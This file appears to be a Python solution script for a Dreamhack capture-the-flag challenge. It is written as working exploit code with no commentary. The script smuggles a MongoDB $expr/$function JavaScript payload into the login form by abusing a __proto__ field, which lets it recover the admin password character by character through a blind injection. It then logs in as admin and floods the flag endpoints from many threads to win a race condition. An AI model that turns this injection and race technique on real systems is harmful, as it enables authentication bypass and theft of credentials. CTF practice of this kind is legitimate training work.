import requests
import string
from threading import Thread

url = "http://host1.dreamhack.games:18421/"

adminPassword = ""

for i in range(32):
    for h in string.hexdigits:
        data = {'username':'","__proto__":{"ex":"',
                'password':'ex"}, "$expr":{"$function":{"body":"function(pw){return pw['+str(i)+'] == \''+h+'\'}","args":["$password"],"lang": "js"}}, "username":"admin'}

        res = requests.post(url+"user/login", data=data)
        if "403" in res.text:
            adminPassword += h
            print(adminPassword)
            break

res = requests.post(url+"user/login", data={'username':'admin','password':adminPassword})
token = res.json()['token']

headers={"Authorization":"bearer "+token}
loop=True

def getFlag():
    global loop
    while loop:
        res=requests.get(url+"admin/check", headers=headers)
        if "404" not in res.text:
            print(res.text)
            loop = False
    
def removeFlag():
    while loop:
        requests.delete(url+"admin/flag", headers=headers)
    
def addFlag():
    while loop:
        requests.get(url+"admin/flag", headers=headers)
    
Thread(target=removeFlag).start()
for i in range(20):
    Thread(target=addFlag).start()
Thread(target=getFlag).start()